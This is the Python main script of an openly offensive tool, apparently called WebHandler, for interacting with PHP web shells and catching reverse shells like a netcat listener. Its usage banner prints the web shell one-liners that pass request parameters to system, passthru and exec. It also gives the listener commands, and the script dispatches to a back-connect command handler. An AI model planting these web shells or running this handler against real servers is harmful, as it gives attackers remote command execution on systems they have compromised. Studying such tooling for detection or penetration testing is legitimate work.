#!/usr/bin/env python

'''
-*- coding: utf-8 -*-

A hanlder for PHP system functions & alternative 'netcat listener'
    - <?php system($_REQUEST['parameter']); ?>
    - netcat -l -p 1234

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Developers:
    Ahmed Shawky ~ @lnxg33k (http://lnxg33k.wordpress.com)
    g0tmi1k ~ @g0tmi1k (http://www.g0tmi1k.com)
'''

# Importing modules
from sys import argv
from platform import platform as OS

from core.libs.executer import commander
from core.libs.listen_handler import listen
from core.libs.menu import getargs
from core.libs.banner import banner
from core.libs.update import update
from core.libs.thirdparty.termcolor import cprint, colored


if len(argv) <= 1:
    cprint("-- Hanlder for PHP system functions & alternative 'netcat listener' --\n", 'blue')
    
    cprint("Example: python webhandler.py --url http://www.mywebsite.com/shell.php?cmd=", 'green')
    cprint("--   Works for POST and GET requests   --", 'blue')
    cprint("1-   <?php system($_GET['parameter']); ?>", 'yellow')
    cprint("2-   <?php passthru($_REQUEST['parameter']); ?>", 'yellow')
    cprint("3-   <?php echo exec($_POST['parameter']); ?>\n", 'yellow')
    
    cprint("Example: python webhandler.py --listen 1234", 'green')
    cprint("--   Alternative 'netcat listener'   --", 'blue')
    cprint("1-   netcat -l -p 1234", 'yellow')
    cprint("2-   nc -lvvp 4321\n", 'yellow')
    print "Run: " + colored("{0} -h".format(argv[0]), 'red') + " for help & more example commands"
    exit(1)

else:
    # Check for arguments dependencies
    if getargs.url:
        if getargs.method == 'post' and not getargs.parameter:
            errmsg = '\n[!] Using post method requires --parameter flag, check help'
            exit(cprint(errmsg, 'red'))
        elif getargs.method == 'get' and getargs.parameter:
            errmsg = '\n[!] Using get method doesn\'t require --parameter flag, check help'
            exit(cprint(errmsg, 'red'))
        else:
            print banner                                            # Print the banner
            commander.BackConnect()                                 # Call BackConnect method to handle input

    elif getargs.listen:
        if 'windows' in OS().lower():
            errmsg = '[!] WebHandler doesn\'t support Windows yet, still working on it.'
            exit(cprint(errmsg, 'red'))
        else:
            listen.wait_connection()                                # Call wait_connection to wait for a connection
            commander.BackConnect()                                 # Call BackConnect method to handle input

    elif getargs.update:
        update()                                                    # Update the script
